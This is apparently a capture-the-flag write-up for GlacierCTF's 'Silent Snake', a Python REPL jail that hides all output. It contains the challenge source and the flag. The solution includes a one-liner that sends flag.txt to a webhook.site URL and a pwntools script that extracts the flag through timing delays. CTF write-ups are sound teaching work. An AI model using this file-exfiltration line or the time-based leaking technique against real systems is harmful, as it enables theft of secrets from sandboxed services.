# Silent Snake [63 Solves]

## Description

> Our favorite protagonist Sloppy Python, was able to sneak into the base of the baddies. Their internal system hosts containts a critical key that needs to be exfiltrated, but all their systems are locked down.
>
> Except for one: An ancient terminal with broken screen and enough ink for a single `ls`.
>
> Can you help Sloppy Python to steal the key?
>
> author: huksys
>
> `nc chall.glacierctf.com 13391`
>
> Attachments: silent_snake.tar.gz

<details><summary>Attachment file tree</summary>

```console
$ tar ztf silent_snake.tar.gz
chall/
chall/silent_snake.py
chall/repl.py
chall/flag.txt
docker-compose.yml
Dockerfile
```

</details>

<details><summary>chall/silent_snake.py</summary>

```python
#!/usr/bin/env python3

import os
import random
import subprocess
import time

DEBUG = os.environ.get("DEBUG", "0") == "1"


def drop_to_unprivileged(uid: int, gid: int):
    # Drop to a unprivileged user and group.
    assert uid != 0 and gid != 0
    os.setresgid(uid, uid, uid)
    os.setresuid(gid, gid, gid)


def drop_to_ctf_uid_gid():
    drop_to_unprivileged(4242, 4242)


(r, w) = os.pipe()
os.set_inheritable(w, True)

print(r)
print(w)

repl = subprocess.Popen(
    ["./repl.py", str(w)], close_fds=False, preexec_fn=drop_to_ctf_uid_gid
)

os.close(w)
ppipe = os.fdopen(r, "r", buffering=1)

allowed = {
    "ls": True,
}


try:
    while repl.poll() == None:
        cmd = ppipe.readline()
        if cmd == "":
            break

        cmd = cmd.strip().split(" ")
        if DEBUG:
            print("RECEIVED COMMAND:", cmd)

        if cmd[0] == "exit":
            break
        elif cmd[0] == "ls" and allowed["ls"] and len(cmd) == 2:
            valid = True
            resolved = []
            path = cmd[1]

            if not path.startswith("-") and os.path.isdir(path):
                cmd = ["ls", "-l", path]
                if DEBUG:
                    print(cmd)

                subprocess.run(
                    cmd,
                    stderr=(subprocess.STDOUT if DEBUG else subprocess.DEVNULL),
                    preexec_fn=drop_to_ctf_uid_gid,
                )

            allowed["ls"] = False
except Exception as ex:
    if DEBUG:
        import traceback

        traceback.print_exc()

if DEBUG:
    print("Terminating REPL process...")

repl.kill()
repl.wait()

if DEBUG:
    print("REPL terminated - waiting...")

time.sleep(random.randrange(300, 600))
```

</details>

<details><summary>chall/repl.py</summary>

```python
#!/usr/bin/env python3

import os
import sys
import code

DEBUG = os.environ.get("DEBUG", "0") == "1"

cpipe = os.fdopen(int(sys.argv[1]), "w", buffering=1)
devnull = open("/dev/null", mode="w")

print(
    """
Welcome to silent-snake, the blind REPL!

You've got a single ls that you can redeem using
`run_command('ls <directory_to_ls>')`

To exit the jail, use `exit()` or `run_command('exit')`

Have fun!
"""
)

if not DEBUG:
    sys.stdout.close()
    sys.stderr.close()
    os.close(1)
    os.close(2)
    sys.stdout = devnull
    sys.stderr = devnull

else:
    print(50 * "=")
    print(
        "WARNING: Debugging mode is *ON*. stdout and stderr are available here, but you won't be able to see the REPL's output during the challenge."
    )
    print(50 * "=")

    # Redirect stderr to stdout
    os.dup2(1, 2, inheritable=True)


def run_command(cmd: str):
    cpipe.write(cmd + "\n")


code.interact(local=locals())

run_command("exit")

print("debug")
```

</details>

## Flag

gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0cf5?}

## Solution

Python code can be executed, but I cannot see the stdout and stderr.

At first, I tried the following payload to send the flag to the Webhook URL.
Successed in the local environment, it failed on the challenge server's environment as the request was not sent.

```python
import http.client; c= http.client.HTTPSConnection('webhook.site'); c.request('POST', '/<yourwebhookpath>', open('/app/flag.txt', 'r').read())
```

Secondly, `import time; time.sleep(5); run_command('ls .')` was executed expectedly.
I will get the flag using a method similar to Time-Based SQL Injection.

```python
from pwn import remote, context
import time
import string

context.log_level = "ERROR"

HOST = "chall.glacierctf.com"
PORT = 13391

flag = "gctf{"

threshold = 3

possible = "}|_-!?" + string.digits + string.ascii_letters

for _ in range(len(flag), 50):
    for c in possible:
        io = remote(HOST, PORT)
        print(flag + c, end="\r", flush=True)

        io.recvuntil(b"Have fun!")

        io.sendline(
            f"import time; open('flag.txt', 'r').read().startswith('{flag+c}') and time.sleep({threshold}); run_command('ls .')".encode(),
        )

        t1 = time.time()

        io.recvuntil(b"silent_snake.py")

        t2 = time.time()

        io.close()
        time.sleep(2)

        if t2 - t1 > threshold:
            flag += c
            print(flag)
            break

print(flag)
```

```console
$ python3 solver.py
gctf{2
gctf{2n
gctf{2nd
gctf{2nd_
gctf{2nd_f
gctf{2nd_f1
gctf{2nd_f10
gctf{2nd_f100
gctf{2nd_f100r
gctf{2nd_f100r_
gctf{2nd_f100r_b
gctf{2nd_f100r_ba
gctf{2nd_f100r_ba5
gctf{2nd_f100r_ba5e
gctf{2nd_f100r_ba5em
gctf{2nd_f100r_ba5eme
gctf{2nd_f100r_ba5emen
gctf{2nd_f100r_ba5ement
gctf{2nd_f100r_ba5ement?
gctf{2nd_f100r_ba5ement?_
gctf{2nd_f100r_ba5ement?_p
gctf{2nd_f100r_ba5ement?_p5
gctf{2nd_f100r_ba5ement?_p5y
gctf{2nd_f100r_ba5ement?_p5yc
gctf{2nd_f100r_ba5ement?_p5ych
gctf{2nd_f100r_ba5ement?_p5ych0
gctf{2nd_f100r_ba5ement?_p5ych0_
gctf{2nd_f100r_ba5ement?_p5ych0_m
gctf{2nd_f100r_ba5ement?_p5ych0_ma
gctf{2nd_f100r_ba5ement?_p5ych0_man
gctf{2nd_f100r_ba5ement?_p5ych0_mant
gctf{2nd_f100r_ba5ement?_p5ych0_mant1
gctf{2nd_f100r_ba5ement?_p5ych0_mant15
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_p
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0c
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0cf
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0cf5
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0cf5?
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0cf5?}
gctf{2nd_f100r_ba5ement?_p5ych0_mant15?_pr0cf5?}
```
